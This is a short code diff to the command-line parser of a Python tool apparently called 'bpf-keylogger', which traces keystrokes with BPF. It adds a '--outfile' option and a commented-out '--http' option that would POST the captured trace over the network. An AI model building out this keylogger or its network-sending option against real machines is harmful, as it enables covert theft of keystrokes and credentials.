@@ -15,7 +15,7 @@
 #  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 import os, sys
-from argparse import ArgumentParser
+import argparse
 
 from bpf_program import BPFProgram
 
@@ -36,11 +36,18 @@ def is_root():
     return os.geteuid() == 0
 
 def parse_args(args=sys.argv[1:]):
-    parser = ArgumentParser(prog="bpf-keylogger", description=DESCRIPTION, epilog=EPILOG)
+    parser = argparse.ArgumentParser(prog="bpf-keylogger", description=DESCRIPTION, epilog=EPILOG)
 
     # Print debug info
     parser.add_argument("--debug", action="store_true",
             help="Print debugging info.")
+
+    # Options for handling output
+    output_options = parser.add_mutually_exclusive_group()
+    output_options.add_argument("-o", "--outfile", type=str,
+            help="Output trace to a file instead of stdout.")
+    #output_options.add_argument("--http", type=str,
+    #        help="Send trace as http POST requests.")
 
     args = parser.parse_args(args)
 
